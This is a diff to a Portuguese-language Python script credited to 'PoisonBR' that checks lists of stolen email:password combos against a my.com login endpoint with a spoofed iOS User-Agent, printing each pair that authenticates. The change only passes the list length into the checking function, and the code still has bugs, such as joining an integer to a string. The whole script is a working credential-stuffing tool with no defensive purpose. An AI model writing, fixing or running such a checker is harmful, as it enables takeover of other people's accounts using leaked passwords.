@@ -58,23 +58,24 @@ print(f'''{B}*By PoisonBR
 db=open(input('Indique o caminho do arquivo: '), 'r').read().splitlines()
 print(G+str(len(db))+C+' e-mails no arquivo.'); time.sleep(3)
 print('Testando credenciais, aguarde...')
+ldb=len(db)
 
-def checker(email, senha, c):
+def checker(email, senha, c, ldb):
     acesso=requests.get('https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login='+email+'&Password='+senha, headers={'User-Agent': 'MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0'}).text
     if ('Ok=1') in acesso:
         print('Credenciais válidas: '+combo)
-        print('E-mails verificados: '+c+', e-mails restantes: '+str(len(db)-c))
+        print('E-mails verificados: '+c+', e-mails restantes: '+str(ldb-c))
 c=0        
 for combo in db:
   if (':') in combo:
     email=combo.split(':')[0]
     senha=combo.split(':')[1]
     c=c+1
-    checker(email, senha, c)
+    checker(email, senha, c, ldb)
   elif ('|') in combo:
     email=combo.split('|')[0]
     senha=combo.split('|')[1]
     c=c+1
-    checker(email, senha, c)
+    checker(email, senha, c, ldb)
   else:
     print('Combo inválido: '+combo)
